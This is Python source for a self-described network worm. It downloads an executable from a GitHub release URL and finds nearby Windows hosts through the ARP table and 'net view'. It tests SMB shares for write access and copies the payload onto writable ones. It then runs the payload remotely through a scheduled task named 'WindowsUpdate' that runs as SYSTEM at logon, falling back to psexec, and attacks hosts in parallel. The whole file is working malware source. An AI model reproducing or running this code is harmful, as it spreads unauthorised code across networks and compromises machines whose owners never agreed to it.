"""
Worm Propagation Script
Detects other hosts on network, finds writable shares, copies payload, executes
Usage: python3 worm.py
"""

import subprocess
import os
import re
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from download_file import download_file

# --- CONFIGURATION PARAMETERS ---
DOWNLOAD_URL = "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/download/v1.0.17/main.exe"
PAYLOAD_PATH = r"C:\Temp"
PAYLOAD_NAME = "monoukfile.exe"
SPREAD_MARKER = r"C:\Windows\Temp\.worm_spread" 

# Correctly joins them to: C:\Temp\monoukfile.exe
TARGET_PATH = os.path.join(PAYLOAD_PATH, PAYLOAD_NAME)

class Worm:
    def __init__(self):
        self.payload_path = TARGET_PATH
        self.infected_hosts = set()
        self.max_workers = 10
    
    def log(self, msg, level="*"):
        """Log messages"""
        print(f"[{level}] {msg}")
    
    def get_arp_hosts(self):
        """Get live hosts from ARP table"""
        try:
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=5)
            ips = re.findall(r'(\d+\.\d+\.\d+\.\d+)', result.stdout)
            # Filter out obvious non-targets (localhost, gateway)
            ips = [ip for ip in ips if not ip.startswith('127.') and not ip.endswith('.1')]
            self.log(f"Found {len(set(ips))} hosts via ARP", "+")
            return list(set(ips))
        except Exception as e:
            self.log(f"ARP scan failed: {e}", "-")
            return []
    
    def get_net_view_hosts(self):
        """Get hosts from net view (SMB browsing)"""
        try:
            result = subprocess.run(['net', 'view'], capture_output=True, text=True, timeout=5)
            # Format: \\HOSTNAME
            hosts = re.findall(r'\\\\(\S+)', result.stdout)
            self.log(f"Found {len(hosts)} hosts via net view", "+")
            return hosts
        except Exception as e:
            self.log(f"net view failed: {e}", "-")
            return []
    
    def get_shares(self, host):
        """Get shares from a host"""
        try:
            result = subprocess.run(['net', 'view', f'\\\\{host}'], 
                                  capture_output=True, text=True, timeout=3)
            # Parse: SHARENAME     Disk    Description
            shares = re.findall(r'^(\S.+?)\s+Disk', result.stdout, re.MULTILINE)
            return shares
        except:
            return []
    
    def is_writable(self, unc_path):
        """Test if a share is writable"""
        try:
            test_file = os.path.join(unc_path, '.worm_test')
            with open(test_file, 'w') as f:
                f.write('test')
            os.remove(test_file)
            return True
        except:
            return False
    
    def copy_payload(self, unc_path):
        """Copy payload to writable share"""
        try:
            if not os.path.exists(self.payload_path):
                self.log(f"Payload not found: {self.payload_path}", "-")
                return False
            
            target = os.path.join(unc_path, PAYLOAD_NAME)
            with open(self.payload_path, 'rb') as src:
                with open(target, 'wb') as dst:
                    dst.write(src.read())
            
            self.log(f"Copied to {target}", "+")
            return True
        except Exception as e:
            self.log(f"Copy failed to {unc_path}: {e}", "-")
            return False
    
    def execute_on_target(self, host, unc_path):
        """Create scheduled task on target to execute payload"""
        try:
            # Use wmic/schtasks to create scheduled task
            payload_path = os.path.join(unc_path, PAYLOAD_NAME)
            
            # Try scheduled task
            cmd = f'schtasks /s {host} /create /tn "WindowsUpdate" /tr "{payload_path}" /sc onlogon /ru SYSTEM /f'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                self.log(f"Scheduled task created on {host}", "+")
                return True
            
            # Fallback: try psexec
            cmd2 = f'psexec \\\\{host} -d {payload_path}'
            result2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True, timeout=5)
            
            if result2.returncode == 0:
                self.log(f"Executed on {host} via psexec", "+")
                return True
            
            return False
        except Exception as e:
            self.log(f"Execute on {host} failed: {e}", "-")
            return False
    
    def exploit_host(self, host):
        """Try to infect a single host"""
        self.log(f"Targeting {host}", "*")
        
        # Get shares
        shares = self.get_shares(host)
        if not shares:
            self.log(f"No shares found on {host}", "-")
            return False
        
        self.log(f"Found shares on {host}: {shares}", "+")
        
        # Try each share
        for share in shares:
            unc_path = f'\\\\{host}\\{share}'
            
            # Check if writable
            if not self.is_writable(unc_path):
                self.log(f"Not writable: {unc_path}", "-")
                continue
            
            self.log(f"Writable share found: {unc_path}", "+")
            
            # Copy payload
            if not self.copy_payload(unc_path):
                continue
            
            # Execute on target
            if self.execute_on_target(host, unc_path):
                self.infected_hosts.add(host)
                self.log(f"INFECTED: {host}", "+")
                return True
        
        return False
    
    def scan_network(self):
        """Main scanning loop"""
        self.log("Starting network scan", "*")
        
        # Get targets
        hosts_arp = self.get_arp_hosts()
        hosts_view = self.get_net_view_hosts()
        all_hosts = list(set(hosts_arp + hosts_view))
        
        self.log(f"Total targets: {len(all_hosts)}", "*")
        
        # Exploit in parallel
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            results = executor.map(self.exploit_host, all_hosts)
            infected_count = sum(1 for r in results if r)
        
        self.log(f"Infected {infected_count}/{len(all_hosts)} hosts", "+")
        return self.infected_hosts
    
    def run(self):
        """Main execution"""
        self.log("Worm initialized", "*")
        
        # Check if already spread from this machine
        if os.path.exists(SPREAD_MARKER):
            self.log("Already spread from this host, exiting", "*")
            return
        
        # Create spread marker
        try:
            Path(SPREAD_MARKER).touch()
        except:
            pass
        
        # Scan and spread
        infected = self.scan_network()
        
        self.log(f"Worm propagation complete. Infected: {infected}", "+")

if __name__ == "__main__":
    if download_file(DOWNLOAD_URL, TARGET_PATH):
        # 3. If download completes successfully, proceed with registry modifications
        worm = Worm()
        worm.run()
    else:
        print("[-] Deployment terminated due to download failure constraints.")
    
